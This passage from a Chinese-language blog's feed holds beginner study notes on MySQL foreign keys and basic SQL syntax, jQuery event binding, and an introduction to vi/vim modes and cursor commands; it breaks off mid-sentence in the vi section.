    <content type="html"><![CDATA[<h2 id="外键"><a href="#外键" class="headerlink" title="外键"></a>外键</h2><p>外键：foreign key，外面的键（键不在自己表中）：如果一张表中有一个字段（非主键）指向另外一张表的主键，那么将该字段称之为外键。</p><h3 id="增加外键"><a href="#增加外键" class="headerlink" title="增加外键"></a>增加外键</h3><p>外键可以在创建表的时候或者创建表之后增加（但是要考虑数据的问题）。<br>一张表可以有多个外键。</p><p>创建表的时候增加外键：在所有的表字段之后，使用<code>foreign key(外键字段)references 外部表(主键字段)</code><br><img src="https://i.imgur.com/ms1L7Nz.png" alt="1"><br>在新增表之后增加外键：修改表结构<br><code>alter table 表名 add[constraint 外键名] foreign key(外键字段) references 父表(主键字段);</code><br><img src="https://i.imgur.com/8hhdoXi.png" alt="2"></p><h3 id="修改外键-amp-删除外键"><a href="#修改外键-amp-删除外键" class="headerlink" title="修改外键&amp;删除外键"></a>修改外键&amp;删除外键</h3><p><strong>外键不可修改：只能先删除后新增</strong><br><strong>删除外键语法:</strong><br><code>alter table 表名 drop foreign key 外键名;</code> 一张表中可以有多个外键，但是名字不能相同<br><img src="https://i.imgur.com/QX3G8Jq.png" alt="3"></p><h3 id="外键作用"><a href="#外键作用" class="headerlink" title="外键作用"></a>外键作用</h3><p>外键默认的作用有两点：一个对父表，一个对字表(外键字段所在的表)<br>对字表约束：子表数据进行写操作(增和改)的时候，如果对应的外键字段在父表找不到对应的匹配：那么操作会失败（约束字表数据操作）<br><img src="https://i.imgur.com/4EfgPLg.png" alt="4"><br>对父表约束：父表数据进行写操作(删和改：都必须涉及到主键本身)，如果对应的主键在子表中已经被数据所引用，那么就不允许操作<br><img src="https://i.imgur.com/PJyPlCm.png" alt="5"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;外键&quot;&gt;&lt;a href=&quot;#外键&quot; class=&quot;headerlink&quot; title=&quot;外键&quot;&gt;&lt;/a&gt;外键&lt;/h2&gt;&lt;p&gt;外键：foreign key，外面的键（键不在自己表中）：如果一张表中有一个字段（非主键）指向另外一张表的主键，那么将该字段称之为外键。&lt;/
      
    
    </summary>
    
    
      <category term="php学习笔记" scheme="https://feng4.github.io/tags/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>mysql操作</title>
    <link href="https://feng4.github.io/2018/12/29/mysql%E6%93%8D%E4%BD%9C/"/>
    <id>https://feng4.github.io/2018/12/29/mysql操作/</id>
    <published>2018-12-29T14:33:33.155Z</published>
    <updated>2018-12-17T02:40:15.723Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SQL基本操作"><a href="#SQL基本操作" class="headerlink" title="SQL基本操作"></a>SQL基本操作</h2><h3 id="库的操作"><a href="#库的操作" class="headerlink" title="库的操作"></a>库的操作</h3><h4 id="新增数据库"><a href="#新增数据库" class="headerlink" title="新增数据库"></a>新增数据库</h4><blockquote><p>基本语法<br><code>create database 数据库名 [库选项]</code><br>库选项：用来约束数据库，分为两个选项：<br>  字符集设定：charset/character set 具体字符集(数据存储的编码格式)：常用字符集GBK、utf-8<br>  校对集设定：collate 具体校对集(数据比较的规则)</p></blockquote><h4 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h4><blockquote><p>查看所有数据库：show databases;<br>查看指定部分的数据库： 模糊查询：<br>  show databases like ‘pattern’; –pattern是匹配模式<br>  %：表示匹配多个字符<br>  _：表示匹配单个字符<br>  <img src="https://i.imgur.com/vQ4zQuM.png" alt="1"><br>查看数据库的创建语句：show create database 数据库名;<br><img src="https://i.imgur.com/kOhmaJ6.png" alt="2"></p></blockquote><h4 id="更新数据库"><a href="#更新数据库" class="headerlink" title="更新数据库"></a>更新数据库</h4><blockquote><p>数据库名字不可以修改<br>数据库的修改仅限<code>库选项</code>：字符集和校对集(校对集依赖字符集)<br>alter database 数据库名字 [库选项];<br>charset/character set[=] 字符集<br>collate 校对集<br><img src="https://i.imgur.com/qYYU99v.png" alt="3"></p></blockquote><h4 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h4><blockquote><p>drop database 数据库名;</p></blockquote><h3 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h3><h4 id="新增数据表"><a href="#新增数据表" class="headerlink" title="新增数据表"></a>新增数据表</h4><blockquote><p><code>create table [if not exists] 表名(字段名 数据类型,字段名 数据类型)[表选项]；</code><br>if not exists :如果表名不存在，那么就创建，否则不执行创建代码：检查功能<br>表选项：控制表的表现<br>   字符集：<code>charset/character set 具体字符集;</code> 保证表中数据储存的字符集<br>   校对集：<code>collate 具体校对集;</code><br>   存储引擎：engine 具体的存储引擎(innodb和myisam)<br>   <img src="https://i.imgur.com/QF5oZiy.png" alt="4"><br>   当创建数据表的SQL指令执行之后，到底发生了什么？<br>   1.指定数据库下已经存在对应的表<br>   2.在数据库对应的文件夹下，会产生对应表的结构文件(跟存储引擎有关系)<br>   <img src="https://i.imgur.com/pK6PzpS.png" alt="5"></p></blockquote><h4 id="查看数据表"><a href="#查看数据表" class="headerlink" title="查看数据表"></a>查看数据表</h4><blockquote><p>查看所有表：<code>show tables;</code><br>查看部分表：模糊匹配：<code>show tables like &#39;pattern&#39;;</code><br><img src="https://i.imgur.com/kXOak4w.png" alt="7"><br>查看表的创建语句：<code>show create table 表名;</code><br>查看表结构：查看表中的字段信息<br>  <code>desc/describe/show columns from 表名;</code><br>  <img src="https://i.imgur.com/X2loxIa.png" alt="8"></p></blockquote><h4 id="修改数据表"><a href="#修改数据表" class="headerlink" title="修改数据表"></a>修改数据表</h4><blockquote><p><strong>修改表本身:</strong><br>  修改表名：<code>rename table 旧表名 to 新表名;</code><br>  修改表选项： <code>alter table 表名 表选项 [=] 值;</code><br>  <img src="https://i.imgur.com/U3GYE7k.png" alt="9"><br>  修改字段：<br>​    新增字段：<code>alter table 表名 add [cloumn] 字段名 数据类型 [列属性][位置];</code><br>​      位置：字段名可以存放表中的任意位置<br>​          first：第一个位置<br>​          after：在哪个字段之后：<code>after 字段名;</code>默认的是在最后一个字段之后<br>​    修改字段：修改通常是修改属性或者数据类型<br>​       <code>alter table 表名 modify 字段名 数据类型 [属性][位置];</code><br>​    重命名字段：<code>alter table 表名 change 旧字段 新字段 数据类型 [属性][位置];</code><br>​    删除字段：<code>alter table 表名 drop 字段名;</code><br><strong>删除数据表：</strong><br>  <code>drop table 表名1,表名2...;</code> 可以一次删除多个表</p></blockquote><h4 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h4><blockquote><p><strong>新增数据</strong><br>  方法1：<code>insert into 表名 values(值列表)[,(值列表)...];</code><br>  方法2：<code>insert into 表名(字段列表)values(值列表)[,(值列表)...];</code><br>  <img src="https://i.imgur.com/oGTuHTk.png" alt="10"><br><strong>查看数据：</strong><br> <code>select */字段列表 from 表名 [where 条件];</code></p><p><code>select distinct 字段 from 表名</code> ——-根据字段筛选数据</p><p> <strong>更新数据：</strong><br>   <code>update 表名 set 字段 = 值 [where 条件];</code><br> <strong>删除数据：</strong><br>   <code>delete from 表名 [where 条件];</code></p></blockquote><h4 id="校对集问题"><a href="#校对集问题" class="headerlink" title="校对集问题"></a>校对集问题</h4><blockquote><p>校对集：数据比较的方式<br>校对集有三种方式：<br>  _bin: binary,二进制比较，取出二进制位，一位一位的比较，区分大小写。<br>  _cs: case sensitive,大小写敏感。<br>  _ci: case insensitive，大小写不敏感。<br>  查看数据库所支持的校对集：<code>show collation;</code><br>  <em>只有当数据产生比较的时候，校对集才会生效。</em><br>  比较：根据某个字段进行排序：<code>order by 字段名 [asc|desc];</code> asc是升序，desc是降序，默认是升序</p></blockquote><h3 id="字段属性"><a href="#字段属性" class="headerlink" title="字段属性"></a>字段属性</h3><h4 id="主键"><a href="#主键" class="headerlink" title="主键"></a>主键</h4><blockquote><p>主键：primary key,主要的键，一张表只能有一个字段可以使用对应的键，用来唯一的约束该字段里面的数据，不能重复：这种称之为主键</p></blockquote><h4 id="增加主键："><a href="#增加主键：" class="headerlink" title="增加主键："></a>增加主键：</h4><blockquote><p>sql操作中有多种方式可以给表增加主键：大体分为三种：<br>  方案1：在创建表的时候，直接在字段之后，跟primary key关键字(主键本身不允许为空)<br>  <img src="https://i.imgur.com/S8gMDEt.png" alt="1"><br>  <strong>优点：</strong>非常直接；<strong>缺点：</strong>只能使用一个字段作为主键<br>  1<br>  方案2：在创建表的时候，在所有的字段之后，使用primary key(主键字段列表)来创建主键(如果有多个字段作为主键，可以是复合主键)<br>  <img src="https://i.imgur.com/kfl6FOY.png" alt="2"><br>  1<br>  方案3：当表已经创建好之后，额外追加主键：可以通过修改表字段属性，也可以直接追加。<br>​    <code>alter table 表名 add primary key(字段列表);</code><br>​    <img src="https://i.imgur.com/6RKb3hP.png" alt="3"><br>​    前提：表中字段对应的数据本身是独立的(不重复)</p></blockquote><h4 id="主键约束"><a href="#主键约束" class="headerlink" title="主键约束"></a>主键约束</h4><blockquote><p>主键对应的字段中的数据不允许重复：一旦重复，数据操作失败（增和改）<br><img src="https://i.imgur.com/ACaIbhh.png" alt="4"></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SQL基本操作&quot;&gt;&lt;a href=&quot;#SQL基本操作&quot; class=&quot;headerlink&quot; title=&quot;SQL基本操作&quot;&gt;&lt;/a&gt;SQL基本操作&lt;/h2&gt;&lt;h3 id=&quot;库的操作&quot;&gt;&lt;a href=&quot;#库的操作&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="php学习笔记" scheme="https://feng4.github.io/tags/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>jQuery事件</title>
    <link href="https://feng4.github.io/2018/11/30/jQuery%E4%BA%8B%E4%BB%B6/"/>
    <id>https://feng4.github.io/2018/11/30/jQuery事件/</id>
    <published>2018-11-30T04:55:41.484Z</published>
    <updated>2018-12-05T16:19:29.647Z</updated>
    
    <content type="html"><![CDATA[<h3 id="加载事件"><a href="#加载事件" class="headerlink" title="加载事件"></a>加载事件</h3><blockquote><p>代码<code>$(document).ready(fn);</code><br>简写：<code>$(function(){});</code><br>注意：<br>js:<code>windows.onload=fn;</code><br>jq:<code>$(document).ready(fn);</code><br><img src="https://i.imgur.com/tSwi0ia.png" alt="1"></p></blockquote><h3 id="事件切换"><a href="#事件切换" class="headerlink" title="事件切换"></a>事件切换</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"div"</span>).hover(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">$(<span class="string">"b"</span>).html(<span class="string">"鼠标放上就变"</span>);<span class="comment">//鼠标放到div标签中，就会变化</span></span><br><span class="line">&#125;,<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">$(<span class="string">"a"</span>).html(<span class="string">"鼠标离开就变"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Ho6LFWb.png" alt="2"></p><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注：selector为选择器，可以使用标签名，或者id等选中要操作的对象。</span></span><br><span class="line">$(selector).click(fn);<span class="comment">//selector的点击事件，会触发fn函数。</span></span><br><span class="line">$(selector).dblclick(fn);<span class="comment">//双击事件。</span></span><br><span class="line">$(selector).focus(fn);<span class="comment">//获得焦点触发事件。</span></span><br><span class="line">$(selector).blur(fn);<span class="comment">//失去焦点。</span></span><br><span class="line">$(selector).change(fn);<span class="comment">//发生改变。</span></span><br><span class="line">$(selector).mouseover(fn);<span class="comment">//鼠标放上。</span></span><br><span class="line">$(selector).mouseout(fn);<span class="comment">//鼠标离开。</span></span><br><span class="line">$(selector).mousedown(fn);<span class="comment">//鼠标按下。</span></span><br><span class="line">$(selector).mouseup(fn);<span class="comment">//鼠标抬起。</span></span><br><span class="line">$(selector).mousemove(fn);<span class="comment">//鼠标移动。</span></span><br><span class="line"><span class="comment">//js的事件都带有on，而jq事件都没有on</span></span><br></pre></td></tr></table></figure><h3 id="鼠标移动事件"><a href="#鼠标移动事件" class="headerlink" title="鼠标移动事件"></a>鼠标移动事件</h3><p><img src="https://i.imgur.com/hITdkvL.png" alt="1"></p><blockquote><p><strong>注：</strong><br>属性是获取x坐标 <code>clientX</code><br>属性是获取y坐标 <code>clientY</code><br>就代表了div标签对象 <code>event</code> </p></blockquote><h3 id="事件处理："><a href="#事件处理：" class="headerlink" title="事件处理："></a>事件处理：</h3><blockquote><p><strong>bind：重点</strong><br>  绑定事件 – <code>bind(&quot;事件名&quot;,fn)</code><br>  如果多个事件：<code>bind({&quot;mouseover&quot;:fn1,&quot;mouseout&quot;:fn2});</code></p></blockquote><blockquote><p><strong>unbind(“事件名”)</strong><br>  解除绑定，如果没有参数，意味着，全部解除绑定<br><img src="https://i.imgur.com/PAXsvB7.png" alt="121"></p></blockquote><blockquote><p><strong>on：重点</strong><br> 绑定事件 `$(select).on(“clcik”,function (){});</p></blockquote><blockquote><p><strong>off解绑</strong><br> 代码：<code>$(select).off();</code><br><img src="https://i.imgur.com/HgPP9gg.png" alt="12"></p></blockquote><blockquote><p><strong>one：绑定事件，只会执行一次</strong><br>代码：<code>$(&quot;#d1&quot;).one(&quot;click&quot;,function (){alert (&quot;你好，世界&quot;);});</code>执行一次后就失效。</p></blockquote><blockquote><p><strong>查找：</strong><br><code>$(selector).parent()</code>—–查找父元素。<br><code>$(selector).find(a)</code>——在selector中找a元素。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;加载事件&quot;&gt;&lt;a href=&quot;#加载事件&quot; class=&quot;headerlink&quot; title=&quot;加载事件&quot;&gt;&lt;/a&gt;加载事件&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;代码&lt;code&gt;$(document).ready(fn);&lt;/code&gt;&lt;br&gt;简写：&lt;code
      
    
    </summary>
    
    
      <category term="jQuery" scheme="https://feng4.github.io/tags/jQuery/"/>
    
  </entry>
  
  <entry>
    <title>vi —— 终端中的编辑器</title>
    <link href="https://feng4.github.io/2018/11/25/vi%E2%80%94%E7%BB%88%E7%AB%AF%E4%B8%AD%E7%9A%84%E7%BC%96%E8%BE%91%E5%99%A8/"/>
    <id>https://feng4.github.io/2018/11/25/vi—终端中的编辑器/</id>
    <published>2018-11-25T09:05:31.169Z</published>
    <updated>2018-11-25T09:34:14.829Z</updated>
    
    <content type="html"><![CDATA[<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul><li><code>vi</code> 简介</li><li>打开和新建文件</li><li>三种工作模式</li><li>常用命令</li><li>分屏命令</li><li>常用命令速查图</li></ul><h2 id="01-vi-简介"><a href="#01-vi-简介" class="headerlink" title="01. vi 简介"></a>01. <code>vi</code> 简介</h2><h3 id="1-1-学习-vi-的目的"><a href="#1-1-学习-vi-的目的" class="headerlink" title="1.1 学习 vi 的目的"></a>1.1 学习 <code>vi</code> 的目的</h3><ul><li>在工作中，要对 <strong>服务器</strong> 上的文件进行 <strong>简单</strong> 的修改，可以使用 <code>ssh</code> 远程登录到服务器上，并且使用 <code>vi</code> 进行快速的编辑即可</li><li>常见需要修改的文件包括：<ul><li><strong>源程序</strong></li><li><strong>配置文件</strong>，例如 <code>ssh</code> 的配置文件 <code>~/.ssh/config</code></li></ul></li></ul><blockquote><ul><li>在没有图形界面的环境下，要编辑文件，<code>vi</code> 是最佳选择！</li><li>每一个要使用 Linux 的程序员，都应该或多或少的学习一些 <code>vi</code> 的常用命令</li></ul></blockquote><h3 id="1-2-vi-和-vim"><a href="#1-2-vi-和-vim" class="headerlink" title="1.2 vi 和 vim"></a>1.2 vi 和 vim</h3><ul><li>在很多 <code>Linux</code> 发行版中，直接把 <code>vi</code> 做成 <code>vim</code> 的软连接</li></ul><h4 id="vi"><a href="#vi" class="headerlink" title="vi"></a>vi</h4><ul><li><code>vi</code> 是 <code>Visual interface</code> 的简称，是 <code>Linux</code> 中 <strong>最经典</strong> 的文本编辑器</li><li><code>vi</code> 的核心设计思想 —— <strong>让程序员的手指始终保持在键盘的核心区域，就能完成所有的编辑操作</strong></li></ul><p><img src="https://i.imgur.com/yGGhPWH.png" alt="vi键盘"></p><ul><li><code>vi</code> 的特点：<ul><li><strong>没有图形界面</strong> 的 <strong>功能强大</strong> 的编辑器</li><li>只能是编辑 <strong>文本内容</strong>，不能对字体、段落进行排版</li><li><strong>不支持鼠标操作</strong></li><li><strong>没有菜单</strong></li><li><strong>只有命令</strong></li></ul></li><li><code>vi</code> 编辑器在 <strong>系统管理</strong>、<strong>服务器管理</strong> 编辑文件时，<strong>其功能永远不是图形界面的编辑器能比拟的</strong></li></ul><h4 id="vim"><a href="#vim" class="headerlink" title="vim"></a><code>vim</code></h4><p><strong>vim = vi improved</strong></p><ul><li><code>vim</code> 是从 <code>vi</code> 发展出来的一个文本编辑器，支持 <strong>代码补全</strong>、<strong>编译</strong> 及 <strong>错误跳转</strong> 等方便编程的功能特别丰富，在程序员中被广泛使用，被称为 <strong>编辑器之神</strong></li></ul><h4 id="查询软连接命令（知道）"><a href="#查询软连接命令（知道）" class="headerlink" title="查询软连接命令（知道）"></a>查询软连接命令（知道）</h4><ul><li>在很多 <code>Linux</code> 发行版中直接把 <code>vi</code> 做成 <code>vim</code> 的软连接</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找 vi 的运行文件</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">which</span> vi</span><br><span class="line">$ ls -l /usr/bin/vi</span><br><span class="line">$ ls -l /etc/alternatives/vi</span><br><span class="line">$ ls -l /usr/bin/vim.basic</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找 vim 的运行文件</span></span><br><span class="line">$ <span class="built_in">which</span> vim</span><br><span class="line">$ ls -l /usr/bin/vim</span><br><span class="line">$ ls -l /etc/alternatives/vim</span><br><span class="line">$ ls -l /usr/bin/vim.basic</span><br></pre></td></tr></table></figure><h2 id="02-打开和新建文件"><a href="#02-打开和新建文件" class="headerlink" title="02. 打开和新建文件"></a>02. 打开和新建文件</h2><ul><li>在终端中输入 <code>vi</code> <strong>在后面跟上文件名</strong> 即可</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vi 文件名</span><br></pre></td></tr></table></figure><ul><li>如果文件已经存在，会直接打开该文件</li><li>如果文件不存在，会新建一个文件</li></ul><h3 id="2-1-打开文件并且定位行"><a href="#2-1-打开文件并且定位行" class="headerlink" title="2.1 打开文件并且定位行"></a>2.1 打开文件并且定位行</h3><ul><li>在日常工作中，有可能会遇到 <strong>打开一个文件，并定位到指定行</strong> 的情况</li><li><p>例如：在开发时，<strong>知道某一行代码有错误</strong>，可以 <strong>快速定位</strong> 到出错代码的位置</p></li><li><p>这个时候，可以使用以下命令打开文件</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vi 文件名 +行数</span><br></pre></td></tr></table></figure><blockquote><p>提示：如果只带上 <code>+</code> 而不指定行号，会直接定位到文件末尾</p></blockquote><h3 id="2-2-异常处理"><a href="#2-2-异常处理" class="headerlink" title="2.2 异常处理"></a>2.2 异常处理</h3><ul><li>如果 <code>vi</code> 异常退出，在磁盘上可能会保存有 <strong>交换文件</strong></li><li>下次再使用 <code>vi</code> 编辑该文件时，会看到以下屏幕信息，按下字母 <code>d</code> 可以 <strong>删除交换文件</strong> 即可</li></ul><blockquote><p>提示：按下键盘时，注意关闭输入法</p></blockquote><p><img src="https://i.imgur.com/U4oCeXj.png" alt="删除交换文件"></p><h2 id="03-三种工作模式"><a href="#03-三种工作模式" class="headerlink" title="03. 三种工作模式"></a>03. 三种工作模式</h2><ul><li><p><code>vi</code> 有三种基本工作模式：</p><ol><li><strong>命令模式</strong><ul><li><strong>打开文件首先进入命令模式</strong>，是使用 <code>vi</code> 的 <strong>入口</strong></li><li>通过 <strong>命令</strong> 对文件进行常规的编辑操作，例如：<strong>定位</strong>、<strong>翻页</strong>、<strong>复制</strong>、<strong>粘贴</strong>、<strong>删除</strong>……</li><li>在其他图形编辑器下，通过 <strong>快捷键</strong> 或者 <strong>鼠标</strong> 实现的操作，都在 <strong>命令模式</strong> 下实现</li></ul></li><li><strong>末行模式</strong> —— 执行 <strong>保存</strong>、<strong>退出</strong> 等操作 <ul><li>要退出 <code>vi</code> 返回到控制台，需要在末行模式下输入命令</li><li><strong>末行模式</strong> 是 <code>vi</code> 的 <strong>出口</strong></li></ul></li><li><strong>编辑模式</strong> —— 正常的编辑文字</li></ol></li></ul><p><img src="https://i.imgur.com/aFHcVyB.png" alt="vi的模式"></p><blockquote><p>提示：在 <code>Touch Bar</code> 的 Mac 电脑上 ，按 <code>ESC</code> 不方便，可以使用 <code>CTRL + [</code> 替代</p></blockquote><h3 id="末行模式命令"><a href="#末行模式命令" class="headerlink" title="末行模式命令"></a>末行模式命令</h3><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">英文</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">w</td><td style="text-align:center">write</td><td>保存</td></tr><tr><td style="text-align:center">q</td><td style="text-align:center">quit</td><td>退出，如果没有保存，不允许退出</td></tr><tr><td style="text-align:center">q!</td><td style="text-align:center">quit</td><td>强行退出，不保存退出</td></tr><tr><td style="text-align:center">wq</td><td style="text-align:center">write &amp; quit</td><td>保存并退出</td></tr><tr><td style="text-align:center">x</td><td style="text-align:center"></td><td>保存并退出</td></tr></tbody></table><h2 id="04-常用命令"><a href="#04-常用命令" class="headerlink" title="04. 常用命令"></a>04. 常用命令</h2><h3 id="命令线路图"><a href="#命令线路图" class="headerlink" title="命令线路图"></a>命令线路图</h3><ol start="0"><li>重复次数<ul><li>在命令模式下，<strong>先输入一个数字</strong>，<strong>再跟上一个命令</strong>，可以让该命令 <strong>重复执行指定次数</strong> </li></ul></li><li>移动和选择（<strong>多练</strong>）<ul><li><code>vi</code> 之所以快，关键在于 <strong>能够快速定位到要编辑的代码行</strong></li><li><strong>移动命令</strong> 能够 和 <strong>编辑操作</strong> 命令 <strong>组合使用</strong></li></ul></li><li>编辑操作<ul><li><strong>删除</strong>、<strong>复制</strong>、<strong>粘贴</strong>、<strong>替换</strong>、<strong>缩排</strong></li></ul></li><li>撤销和重复</li><li>查找替换</li><li>编辑</li></ol><h4 id="学习提示"><a href="#学习提示" class="headerlink" title="学习提示"></a>学习提示</h4><ol><li><code>vi</code> 的命令较多，<strong>不要期望一下子全部记住</strong>，个别命令忘记了，只是会影响编辑速度而已</li><li>在使用 <code>vi</code> 命令时，注意 <strong>关闭中文输入法</strong></li></ol><h3 id="4-1-移动（基本）"><a href="#4-1-移动（基本）" class="headerlink" title="4.1 移动（基本）"></a>4.1 移动（基本）</h3><ul><li>要熟练使用 <code>vi</code>，首先应该学会怎么在 <strong>命令模式</strong> 下样快速移动光标</li><li><strong>编辑操作命令</strong>，能够和 <strong>移动命令</strong> 结合在一起使用</li></ul><h4 id="1-上、下、左、右"><a href="#1-上、下、左、右" class="headerlink" title="1) 上、下、左、右"></a>1) 上、下、左、右</h4><table><thead><tr><th style="text-align:center">命令</th><th>功能</th><th style="text-align:center">手指</th></tr></thead><tbody><tr><td style="text-align:center">h</td><td>向左</td><td style="text-align:center">食指</td></tr><tr><td style="text-align:center">j</td><td>向下</td><td style="text-align:center">食指</td></tr><tr><td style="text-align:center">k</td><td>向上</td><td style="text-align:center">中指</td></tr><tr><td style="text-align:center">l</td><td>向右</td><td style="text-align:center">无名指</td></tr></tbody></table><p><img src="https://i.imgur.com/gCMx6F9.png" alt="移动光标"></p><h4 id="2-行内移动"><a href="#2-行内移动" class="headerlink" title="2) 行内移动"></a>2) 行内移动</h4><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">英文</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">w</td><td style="text-align:center">word</td><td>向后移动一个单词</td></tr><tr><td style="text-align:center">b</td><td style="text-align:center">back</td><td>向前移动一个单词</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center"></td><td>行首</td></tr><tr><td style="text-align:center">^</td><td style="text-align:center"></td><td>行首，第一个不是空白字符的位置</td></tr><tr><td style="text-align:center">$</td><td style="text-align:center"></td><td>行尾</td></tr></tbody></table><h4 id="3-行数移动"><a href="#3-行数移动" class="headerlink" title="3) 行数移动"></a>3) 行数移动</h4><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">英文</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">gg</td><td style="text-align:center">go</td><td>文件顶部</td></tr><tr><td style="text-align:center">G</td><td style="text-align:center">go</td><td>文件末尾</td></tr><tr><td style="text-align:center">数字gg</td><td style="text-align:center">go</td><td>移动到 数字 对应行数</td></tr><tr><td style="text-align:center">数字G</td><td style="text-align:center">go</td><td>移动到 数字 对应行数</td></tr><tr><td style="text-align:center">:数字</td><td style="text-align:center"></td><td>移动到 数字 对应行数</td></tr></tbody></table><h4 id="4-屏幕移动"><a href="#4-屏幕移动" class="headerlink" title="4) 屏幕移动"></a>4) 屏幕移动</h4><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">英文</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">Ctrl + b</td><td style="text-align:center">back</td><td>向上翻页</td></tr><tr><td style="text-align:center">Ctrl + f</td><td style="text-align:center">forward</td><td>向下翻页</td></tr><tr><td style="text-align:center">H</td><td style="text-align:center">Head</td><td>屏幕顶部</td></tr><tr><td style="text-align:center">M</td><td style="text-align:center">Middle</td><td>屏幕中间</td></tr><tr><td style="text-align:center">L</td><td style="text-align:center">Low</td><td>屏幕底部</td></tr></tbody></table><h3 id="4-2-移动（程序）"><a href="#4-2-移动（程序）" class="headerlink" title="4.2 移动（程序）"></a>4.2 移动（程序）</h3><h4 id="1-段落移动"><a href="#1-段落移动" class="headerlink" title="1) 段落移动"></a>1) 段落移动</h4><ul><li><code>vi</code> 中使用 空行 来区分段落</li><li>在程序开发时，通常 <strong>一段功能相关的代码会写在一起</strong> —— 之间没有空行</li></ul><table><thead><tr><th style="text-align:center">命令</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">{</td><td>上一段</td></tr><tr><td style="text-align:center">}</td><td>下一段</td></tr></tbody></table><h4 id="2-括号切换"><a href="#2-括号切换" class="headerlink" title="2) 括号切换"></a>2) 括号切换</h4><ul><li>在程序世界中，<code>()</code>、<code>[]</code>、<code>{}</code> 使用频率很高，而且 <strong>都是成对出现的</strong></li></ul><table><thead><tr><th style="text-align:center">命令</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">%</td><td>括号匹配及切换</td></tr></tbody></table><h4 id="3-标记"><a href="#3-标记" class="headerlink" title="3) 标记"></a>3) 标记</h4><ul><li>在开发时，某一块代码可能<strong>需要稍后处理</strong>，例如：编辑、查看</li><li>此时先使用 <code>m</code> 增加一个标记，这样可以 <strong>在需要时快速地跳转回来</strong> 或者 <strong>执行其他编辑操作</strong></li><li><strong>标记名称</strong> 可以是 <code>a~z</code> 或者 <code>A~Z</code> 之间的任意 <strong>一个</strong> 字母</li><li>添加了标记的 <strong>行如果被删除</strong>，<strong>标记同时被删除</strong></li><li>如果 <strong>在其他行添加了相同名称的标记</strong>，<strong>之前添加的标记也会被替换掉</strong></li></ul><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">英文</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">mx</td><td style="text-align:center">mark</td><td>添加标记 x，x 是 a~z 或者 A~Z 之间的任意一个字母</td></tr><tr><td style="text-align:center">‘x</td><td style="text-align:center"></td><td>直接定位到标记 x 所在位置</td></tr></tbody></table><h3 id="4-3-选中文本（可视模式）"><a href="#4-3-选中文本（可视模式）" class="headerlink" title="4.3 选中文本（可视模式）"></a>4.3 选中文本（可视模式）</h3><ul><li>学习 <code>复制</code> 命令前，应该先学会 <strong>怎么样选中 要复制的代码</strong></li><li>在 <code>vi</code> 中要选择文本，需要先使用 <code>Visual</code> 命令切换到 <strong>可视模式</strong></li><li><code>vi</code> 中提供了 <strong>三种</strong> 可视模式，可以方便程序员选择 <strong>选中文本的方式</strong></li><li>按 <code>ESC</code> 可以放弃选中，返回到 <strong>命令模式</strong></li></ul><table><thead><tr><th style="text-align:center">命令</th><th>模式</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">v</td><td>可视模式</td><td>从光标位置开始按照正常模式选择文本</td></tr><tr><td style="text-align:center">V</td><td>可视行模式</td><td>选中光标经过的完整行</td></tr><tr><td style="text-align:center">Ctrl + v</td><td>可视块模式</td><td>垂直方向选中文本</td></tr></tbody></table><ul><li><strong>可视模式</strong>下，可以和 <strong>移动命令</strong> 